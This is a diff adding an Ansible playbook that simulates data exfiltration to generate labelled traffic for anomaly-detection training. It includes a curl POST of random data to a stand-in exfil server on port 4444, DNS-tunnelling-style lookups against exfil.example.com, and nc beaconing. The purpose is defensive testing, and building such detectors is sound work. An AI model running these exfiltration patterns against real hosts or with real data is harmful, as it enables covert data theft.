@@ -1,0 +1,57 @@
+# Ansible playbook: Data exfiltration simulation
+# PURPOSE: generate labelled exfiltration traffic for anomaly detection training.
+---
+- name: Data Exfiltration Simulation
+  hosts: localhost
+  gather_facts: false
+  vars:
+    target_namespace: securecloud
+    pivot_pod: "{{ lookup('env', 'PIVOT_POD') }}"
+    exfil_server: "{{ lookup('env', 'EXFIL_SERVER') | default('10.0.0.99') }}"
+    exfil_port: "{{ lookup('env', 'EXFIL_PORT') | default('4444') }}"
+    output_dir: /tmp/exfil-results
+
+  tasks:
+    - name: Create output directory
+      file:
+        path: "{{ output_dir }}"
+        state: directory
+
+    - name: Simulate large-volume HTTP POST (data exfil pattern)
+      shell: |
+        # Generate 10MB of dummy data and POST it out
+        dd if=/dev/urandom bs=1M count=10 2>/dev/null | \
+        curl -s -X POST \
+             -H "Content-Type: application/octet-stream" \
+             --data-binary @- \
+             http://{{ exfil_server }}:{{ exfil_port }}/upload || true
+      register: http_exfil
+      ignore_errors: true
+
+    - name: Simulate DNS tunnelling pattern (high-frequency DNS queries)
+      shell: |
+        for i in $(seq 1 100); do
+          nslookup "data-${i}.exfil.example.com" 8.8.8.8 > /dev/null 2>&1 || true
+        done
+        echo "DNS tunnel simulation done"
+      register: dns_tunnel
+      ignore_errors: true
+
+    - name: Simulate TCP beaconing (periodic outbound connections)
+      shell: |
+        for i in $(seq 1 20); do
+          nc -z -w1 {{ exfil_server }} {{ exfil_port }} 2>/dev/null || true
+          sleep 5
+        done
+        echo "Beaconing simulation done"
+      register: beaconing
+      async: 120
+      poll: 0
+
+    - name: Log simulation summary
+      copy:
+        content: |
+          HTTP exfil: {{ http_exfil.rc | default('n/a') }}
+          DNS tunnel: {{ dns_tunnel.stdout | default('n/a') }}
+          Beaconing: launched async
+        dest: "{{ output_dir }}/exfil_summary.txt"
